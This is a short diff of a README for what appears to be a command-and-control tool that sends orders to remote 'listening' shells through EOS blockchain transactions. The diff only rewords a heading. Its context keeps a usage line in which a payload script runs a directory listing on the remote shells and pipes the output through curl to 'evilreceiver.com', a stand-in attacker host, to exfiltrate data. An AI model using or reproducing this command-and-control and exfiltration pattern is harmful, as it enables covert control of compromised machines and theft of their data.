@@ -13,7 +13,7 @@ Run the command to start the daemond listening in the blockchain address. When r
 
 Send to a EOS address command line to execute orders
 
-## Execute commands in each opened shell
+## Execute commands in each listening shell
 
 `python3 payloads/send-eos.py eosaccountname` "ls -lsa | xargs ... | curl https://evilreceiver.com" .... -d {1}
 
